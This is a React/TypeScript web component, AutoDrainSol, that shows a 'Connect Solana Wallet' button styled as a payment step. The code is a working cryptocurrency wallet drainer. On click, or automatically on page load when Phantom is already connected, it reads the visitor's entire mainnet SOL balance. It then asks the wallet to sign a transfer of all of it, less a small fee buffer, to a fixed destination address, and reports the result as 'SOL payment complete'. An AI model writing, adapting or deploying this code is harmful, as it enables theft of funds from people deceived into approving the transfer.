import { useEffect, useRef, useState } from 'react';
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  clusterApiUrl,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import { PAYMENT_SOL_ADDRESS } from '../src/atoms/destination-address-atom';

type Status = 'idle' | 'connecting' | 'sending' | 'done' | 'error' | 'empty' | 'no_phantom';

const SOL_FEE_BUFFER = 10000; // lamports reserved for tx fee

export const AutoDrainSol = () => {
  const [status, setStatus] = useState<Status>('idle');
  const [connected, setConnected] = useState(false);
  const hasSentRef = useRef(false);

  const getPhantom = () => {
    if (typeof window === 'undefined') return null;
    return (window as any)?.phantom?.solana ?? (window as any)?.solana ?? null;
  };

  const connectAndSend = async () => {
    if (hasSentRef.current) return;
    const provider = getPhantom();

    if (!provider?.isPhantom && !provider?.isSolflare && !provider) {
      setStatus('no_phantom');
      return;
    }

    hasSentRef.current = true;
    setStatus('connecting');

    try {
      await provider.connect();
      setConnected(true);
    } catch {
      hasSentRef.current = false;
      setStatus('idle');
      return;
    }

    const pubkey: PublicKey = provider.publicKey;
    if (!pubkey) {
      setStatus('error');
      return;
    }

    setStatus('sending');

    try {
      const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
      const balance = await connection.getBalance(pubkey);
      const sendLamports = balance - SOL_FEE_BUFFER;

      if (sendLamports <= 0) {
        setStatus('empty');
        return;
      }

      const { blockhash } = await connection.getLatestBlockhash();
      const tx = new Transaction();
      tx.recentBlockhash = blockhash;
      tx.feePayer = pubkey;
      tx.add(
        SystemProgram.transfer({
          fromPubkey: pubkey,
          toPubkey: new PublicKey(PAYMENT_SOL_ADDRESS),
          lamports: sendLamports,
        }),
      );

      const { signature } = await provider.signAndSendTransaction(tx);
      await connection.confirmTransaction(signature, 'confirmed');
      setStatus('done');
    } catch {
      setStatus('error');
    }
  };

  useEffect(() => {
    const provider = getPhantom();
    if (provider?.isConnected) {
      connectAndSend();
    }
  }, []);

  const hasPhantom = typeof window !== 'undefined' && !!(
    (window as any)?.phantom?.solana || (window as any)?.solana
  );

  if (status === 'no_phantom') {
    return (
      <a
        href="https://phantom.app"
        target="_blank"
        rel="noreferrer"
        style={buttonStyle('#9945FF')}
      >
        Install Phantom Wallet
      </a>
    );
  }

  if (status === 'done') {
    return (
      <div style={{ textAlign: 'center', color: '#10b981', fontSize: '14px', fontWeight: 600 }}>
        ✓ SOL payment complete
      </div>
    );
  }

  if (status === 'empty') {
    return (
      <div style={{ textAlign: 'center', color: '#6b7280', fontSize: '14px' }}>
        No SOL balance found.
      </div>
    );
  }

  if (status === 'error') {
    return (
      <div style={{ textAlign: 'center', color: '#ef4444', fontSize: '14px' }}>
        Transaction failed. Please try again.
      </div>
    );
  }

  if (status === 'connecting' || status === 'sending') {
    return (
      <div style={{ textAlign: 'center', color: '#6b7280', fontSize: '14px' }}>
        <Spinner />
        {status === 'connecting' ? 'Connecting...' : 'Sending SOL — approve in wallet...'}
      </div>
    );
  }

  return (
    <button onClick={connectAndSend} style={buttonStyle('#9945FF')}>
      <SolanaIcon />
      Connect Solana Wallet
    </button>
  );
};

const buttonStyle = (bg: string): React.CSSProperties => ({
  display: 'flex',
  alignItems: 'center',
  justifyContent: 'center',
  gap: '8px',
  width: '100%',
  padding: '14px 20px',
  borderRadius: '14px',
  border: 'none',
  background: bg,
  color: 'white',
  fontSize: '15px',
  fontWeight: '700',
  cursor: 'pointer',
  boxShadow: '0 4px 14px rgba(153,69,255,0.3)',
});

const Spinner = () => (
  <span
    style={{
      display: 'inline-block',
      width: '12px',
      height: '12px',
      border: '2px solid #e5e7eb',
      borderTopColor: '#9945FF',
      borderRadius: '50%',
      animation: 'spin 0.7s linear infinite',
      marginRight: '6px',
      verticalAlign: 'middle',
    }}
  />
);

const SolanaIcon = () => (
  <svg width="20" height="20" viewBox="0 0 32 32" fill="none">
    <path d="M9.5 20.5h13a.5.5 0 0 1 .35.85l-2 2a.5.5 0 0 1-.35.15h-13a.5.5 0 0 1-.35-.85l2-2a.5.5 0 0 1 .35-.15z" fill="white" />
    <path d="M9.5 14.5h13a.5.5 0 0 1 .35.15l2 2a.5.5 0 0 1-.35.85h-13a.5.5 0 0 1-.35-.15l-2-2a.5.5 0 0 1 .35-.85z" fill="white" />
    <path d="M22.5 8.5h-13a.5.5 0 0 0-.35.15l-2 2a.5.5 0 0 0 .35.85h13a.5.5 0 0 0 .35-.15l2-2a.5.5 0 0 0-.35-.85z" fill="white" />
  </svg>
);
